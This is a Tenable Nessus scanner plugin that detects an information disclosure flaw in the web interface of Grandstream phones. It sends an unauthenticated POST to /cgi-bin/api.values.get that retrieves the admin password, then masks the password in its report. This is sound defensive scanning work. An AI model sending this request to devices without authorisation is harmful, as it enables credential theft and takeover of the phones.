#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(103513);
  script_version("$Revision: 1.1 $");
  script_cvs_date("$Date: 2017/09/27 21:37:02 $");

  script_name(english:"Grandstream Phone Web UI Information Disclosure");
  script_summary(english:"Attempts to recover the admin password");

  script_set_attribute(attribute:"synopsis", value:
"The remote device is affected by an information disclosure
vulnerability");
  script_set_attribute(attribute:"description", value:
"The remote Grandstream phone is affected by an information
disclosure vulnerability in the web administration
interface due to the failure to restrict access to sensitive
configuration data. An unauthenticated, remote attacker
can exploit this to disclose sensitive information related
to the device, such as the admin password.");
  script_set_attribute(attribute:"solution", value:
"Upgrade to the latest firmware verison.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/11/09");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/11/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/09/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencies("grandstream_www_detect.nbin");
  script_require_keys("installed_sw/Grandstream Phone");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

get_install_count(app_name:"Grandstream Phone", exit_if_zero:TRUE);
port = get_http_port(default:80, embedded:TRUE);
install = get_single_install(app_name:"Grandstream Phone", port:port);

# request the admin web interface password (2)
uri = '/cgi-bin/api.values.get';
res = http_send_recv3(
  method:'POST',
  item:uri,
  data:'request=2&sid=',
  port:port,
  add_headers: {'Content-Type':'application/x-www-form-urlencoded'},
  exit_on_fail:TRUE);

# {"response":"success", "body":{"2" : "disisapassword"}}'
match = pregmatch(string:res[2], pattern:'"2"\\s*:\\s*"([^\\"]+)"');
if (empty_or_null(match) || empty_or_null(match[1]))
{
  audit(AUDIT_HOST_NOT, "an affected Grandstream phone");
}

# mask the actual password
pass = match[1];
obfuscated_password = strcat(pass[0], crap(data:'*', length:15), pass[strlen(pass)-1]);

report = 
  '\n' + "Nessus was able to determine the admin password for the" +
  '\n' + "remote host. Note the real password has been obfuscated :" +
  '\n' +
  '\n' + "  URL     : " + build_url(port:port, qs:uri) + 
  '\n' + "  Password : " + obfuscated_password + '\n';
security_report_v4(severity:SECURITY_HOLE, port:port, extra:report);
exit(0);

